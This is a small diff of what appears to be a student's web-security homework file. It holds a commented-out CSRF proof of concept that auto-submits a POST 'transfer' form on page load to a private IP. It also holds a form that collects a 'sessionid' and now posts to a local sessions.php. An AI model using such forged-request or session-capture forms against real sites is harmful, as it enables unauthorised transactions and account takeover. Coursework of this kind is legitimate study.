@@ -24,6 +24,7 @@
 </body> -->
 
 <!-- HW1Q4 ------------------------------------------------------------------------>
+<!-- reference on creating a CSRF attack via POST: https://owasp.org/www-community/attacks/csrf -->
 <!-- <body onload="document.forms[0].submit()">
 
     <form action="http://192.168.2.98:49698/transfer" method="POST">
@@ -34,7 +35,8 @@
 </body> -->
 
 <!-- HW1Q5 ------------------------------------------------------------------------>
-<form action="https://an9374@github.io/sessions.php">
+<form action="sessions.php" method="POST">
     <input type="text" name="sessionid" />
     <input type="submit" value="submit"/>
 </form>
+
